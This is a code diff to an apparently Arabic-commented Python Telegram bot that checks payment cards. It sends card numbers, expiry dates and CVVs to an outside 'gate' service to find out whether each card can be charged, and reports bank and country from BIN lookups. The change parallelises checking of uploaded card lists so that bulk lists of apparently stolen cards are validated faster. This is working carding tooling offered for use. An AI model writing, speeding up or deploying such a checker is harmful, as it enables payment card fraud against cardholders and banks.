@@ -17,21 +17,28 @@ gate_index = 0
 stop_users = {}
 
 # تسريع الفحص
-api_semaphore = asyncio.Semaphore(6)
+api_semaphore = asyncio.Semaphore(12)  # رفع العدد للتوازي أسرع
 
 # ------------------- BIN Lookup -------------------
 async def get_bin_info(bin_number):
-    try:
-        async with httpx.AsyncClient(timeout=10) as client:
-            r = await client.get(f"https://lookup.binlist.net/{bin_number}")
-            data = r.json()
-            brand = data.get("scheme", "N/A")
-            card_type = data.get("type", "N/A")
-            bank = data.get("bank", {}).get("name", "N/A")
-            country = data.get("country", {}).get("name", "N/A")
-            return f"{brand} - {card_type}", bank, country
-    except:
-        return "N/A", "N/A", "N/A"
+    # نجرب جلب البيانات من أكثر من مصدر لتقليل N/A
+    urls = [
+        f"https://lookup.binlist.net/{bin_number}",
+        f"https://lookup.binlist.com/{bin_number}"  # API احتياطي
+    ]
+    for url in urls:
+        try:
+            async with httpx.AsyncClient(timeout=10) as client:
+                r = await client.get(url)
+                data = r.json()
+                brand = data.get("scheme") or "Unknown"
+                card_type = data.get("type") or "Unknown"
+                bank = data.get("bank", {}).get("name") or "Unknown"
+                country = data.get("country", {}).get("name") or "Unknown"
+                return f"{brand} - {card_type}", bank, country
+        except:
+            continue
+    return "Unknown", "Unknown", "Unknown"
 
 # ------------------- Check API -------------------
 async def check_card_api(card_full):
@@ -49,17 +56,14 @@ async def check_card_api(card_full):
         try:
             async with httpx.AsyncClient(timeout=20) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
-
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
-
             if "charge" in result or "success" in result:
                 return "approved", result_raw
             elif "insufficient" in result:
                 return "live", result_raw
             else:
                 return "declined", result_raw
-
         except:
             return "declined", "Error"
 
@@ -67,14 +71,12 @@ async def check_card_api(card_full):
 async def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
-
     if status == "approved":
         title = "#Charge ✅"
     elif status == "live":
         title = "#Live 🟢"
     else:
         title = "#Declined ❌"
-
     return f"""{title}
 
 💳 Card: {card_full}
@@ -96,11 +98,9 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_full:
         await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
         return
-
     start_time = time.time()
     status, response = await check_card_api(card_full)
     taken = round(time.time() - start_time, 2)
-
     text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
 
@@ -123,47 +123,34 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await file.download_to_drive(file_path)
 
     results_file_path = f"downloads/results_{file.file_id}.txt"
-
     approved = live = declined = 0
     panel_msg = await update.message.reply_text("Start Checking... 🔍")
 
     with open(file_path, 'r', encoding='utf-8') as f:
         lines = f.readlines()
 
-    with open(results_file_path, 'w', encoding='utf-8') as result_file:
-        for i, line in enumerate(lines):
-            if stop_users.get(user_id):
-                await update.message.reply_text("Stopped ⛔")
-                return
-
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match:
-                continue
-
-            card_full = match[0]
-            start_time = time.time()
-            status, response = await check_card_api(card_full)
-            taken = round(time.time() - start_time, 2)
-
-            text = await format_response(card_full, status, response, taken)
-
-            # تحديث العدادات وإرسال الرسائل حسب الحالة
-            if status == "approved":
-                approved += 1
-                await update.message.reply_text(text)
-            elif status == "live":
-                live += 1
-                await update.message.reply_text(text)
-            else:
-                declined += 1
-                # Declined ما تتبعتش، بس تظهر في اللوحة
-
-            # حفظ في ملف النتائج
-            result_file.write(text + "\n\n")
-
-            # تحديث اللوحة لكل بطاقة
-            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
-            panel = f"""📊 Status
+    # تجهيز المهام المتوازية لتسريع الفحص
+    async def process_line(line):
+        nonlocal approved, live, declined
+        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+        if not match:
+            return None
+        card_full = match[0]
+        start_time = time.time()
+        status, response = await check_card_api(card_full)
+        taken = round(time.time() - start_time, 2)
+        text = await format_response(card_full, status, response, taken)
+        if status == "approved":
+            approved += 1
+            await update.message.reply_text(text)
+        elif status == "live":
+            live += 1
+            await update.message.reply_text(text)
+        else:
+            declined += 1  # Declined لا تبعت رسالة
+        # تحديث اللوحة لكل بطاقة
+        last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
+        panel = f"""📊 Status
 
 ✅ Charge: {approved}
 🟢 Live: {live}
@@ -181,12 +168,21 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 ⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
 """
-            try:
-                await panel_msg.edit_text(panel)
-            except:
-                pass
+        try:
+            await panel_msg.edit_text(panel)
+        except:
+            pass
+        return text
 
-            await asyncio.sleep(0.2)
+    # تنفيذ كل البطاقات بالتوازي
+    tasks = [process_line(line) for line in lines]
+    results = await asyncio.gather(*tasks)
+
+    # حفظ كل النتائج في ملف
+    with open(results_file_path, 'w', encoding='utf-8') as result_file:
+        for r in results:
+            if r:
+                result_file.write(r + "\n\n")
 
     await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
 
